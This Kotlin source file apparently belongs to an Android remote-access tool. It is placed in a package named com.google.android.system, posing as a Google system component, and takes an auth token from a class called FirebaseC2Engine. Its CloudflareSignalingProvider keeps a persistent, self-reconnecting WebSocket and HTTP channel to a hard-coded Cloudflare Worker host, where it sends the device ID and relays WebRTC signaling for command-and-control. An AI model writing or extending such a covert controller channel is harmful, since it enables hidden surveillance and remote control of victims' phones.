package com.google.android.system

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject

/**
 * CloudflareSignalingProvider
 *
 * Secondary, redundant WebRTC signaling provider using Cloudflare Worker Durable Objects + WebSocket.
 */
class CloudflareSignalingProvider(
    private val context: Context,
    private val firebaseEngine: FirebaseC2Engine,
    private val httpClient: OkHttpClient = OkHttpClient()
) {
    companion object {
        private const val TAG = "CloudflareSignaling"
        private const val CLOUDFLARE_WORKER_URL = "https://webrtc.johnduck99.workers.dev"
    }

    interface Listener {
        fun onEnvelopeReceived(envelope: SignalingEnvelope)
        fun onConnected()
        fun onDisconnected()
    }

    private var listener: Listener? = null
    private var webSocket: WebSocket? = null
    private var isConnected = false
    private var reconnectJob: Job? = null
    private var scope: CoroutineScope? = null

    fun setListener(listener: Listener?) {
        this.listener = listener
    }

    fun start(coroutineScope: CoroutineScope) {
        this.scope = coroutineScope
        connectWebSocket()
    }

    fun stop() {
        reconnectJob?.cancel()
        reconnectJob = null
        webSocket?.close(1000, "Normal closure")
        webSocket = null
        isConnected = false
    }

    private fun connectWebSocket() {
        val currentScope = scope ?: return
        reconnectJob?.cancel()
        reconnectJob = currentScope.launch(Dispatchers.IO) {
            try {
                val token = firebaseEngine.getAuthToken()
                if (token.isNullOrBlank()) {
                    Log.w(TAG, "Cannot connect to Cloudflare Worker: No Firebase auth token available")
                    delay(5000L)
                    if (isActive) connectWebSocket()
                    return@launch
                }

                val devId = DeviceIdProvider.getDeviceId(context)
                val ticketReqUrl = "$CLOUDFLARE_WORKER_URL/v1/connect-ticket"

                val ticketBody = JSONObject().apply {
                    put("deviceId", devId)
                    put("role", "ANDROID")
                }.toString().toRequestBody("application/json".toMediaTypeOrNull())

                val ticketRequest = Request.Builder()
                    .url(ticketReqUrl)
                    .addHeader("Authorization", "Bearer $token")
                    .post(ticketBody)
                    .build()

                var ticket: String? = null
                httpClient.newCall(ticketRequest).execute().use { response ->
                    if (response.isSuccessful) {
                        val bodyStr = response.body?.string() ?: ""
                        if (bodyStr.startsWith("{")) {
                            val json = JSONObject(bodyStr)
                            if (json.has("ticket")) {
                                ticket = json.getString("ticket")
                            }
                        }
                    } else {
                        Log.w(TAG, "Ticket request returned HTTP ${response.code}")
                    }
                }

                if (ticket.isNullOrBlank()) {
                    Log.w(TAG, "Cloudflare ticket retrieval failed. Retrying in 10s...")
                    delay(10_000L)
                    if (isActive) connectWebSocket()
                    return@launch
                }

                val wsUrl = "$CLOUDFLARE_WORKER_URL/v1/devices/$devId/signal?ticket=$ticket"
                    .replace("https://", "wss://")
                    .replace("http://", "ws://")

                val wsRequest = Request.Builder().url(wsUrl).build()

                webSocket = httpClient.newWebSocket(wsRequest, object : WebSocketListener() {
                    override fun onOpen(webSocket: WebSocket, response: Response) {
                        Log.i(TAG, "Cloudflare Worker WebSocket Connected 🟢")
                        isConnected = true
                        listener?.onConnected()
                    }

                    override fun onMessage(webSocket: WebSocket, text: String) {
                        try {
                            if (text.startsWith("{")) {
                                val json = JSONObject(text)
                                val envelope = SignalingEnvelope.fromJsonObject(json)
                                if (envelope != null) {
                                    listener?.onEnvelopeReceived(envelope)
                                }
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "WebSocket message parse error: ${e.message}")
                        }
                    }

                    override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                        Log.w(TAG, "Cloudflare Worker WebSocket Closing: $reason ($code)")
                    }

                    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                        Log.i(TAG, "Cloudflare Worker WebSocket Closed")
                        isConnected = false
                        listener?.onDisconnected()
                        scheduleReconnect()
                    }

                    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                        Log.e(TAG, "Cloudflare Worker WebSocket Failure: ${t.message}")
                        isConnected = false
                        listener?.onDisconnected()
                        scheduleReconnect()
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Cloudflare Worker connect error: ${e.message}")
                scheduleReconnect()
            }
        }
    }

    private fun scheduleReconnect() {
        val currentScope = scope ?: return
        reconnectJob?.cancel()
        reconnectJob = currentScope.launch(Dispatchers.IO) {
            delay(5000L)
            if (isActive) connectWebSocket()
        }
    }

    suspend fun publishEnvelope(envelope: SignalingEnvelope): Boolean = withContext(Dispatchers.IO) {
        val ws = webSocket
        if (ws != null && isConnected) {
            try {
                val sent = ws.send(envelope.toJsonObject().toString())
                if (sent) return@withContext true
            } catch (e: Exception) {
                Log.w(TAG, "WebSocket send failed: ${e.message}")
            }
        }

        // Fallback HTTP push to Worker if WebSocket is currently buffering/reconnecting
        try {
            val devId = DeviceIdProvider.getDeviceId(context)
            val httpReqUrl = "$CLOUDFLARE_WORKER_URL/api/webrtc/event"
            val body = JSONObject().apply {
                put("deviceId", devId)
                put("envelope", envelope.toJsonObject())
            }.toString().toRequestBody("application/json".toMediaTypeOrNull())

            val token = firebaseEngine.getAuthToken()
            val reqBuilder = Request.Builder().url(httpReqUrl).post(body)
            if (!token.isNullOrBlank()) {
                reqBuilder.addHeader("Authorization", "Bearer $token")
            }

            httpClient.newCall(reqBuilder.build()).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e(TAG, "Cloudflare Worker HTTP fallback error: ${e.message}")
            false
        }
    }
}
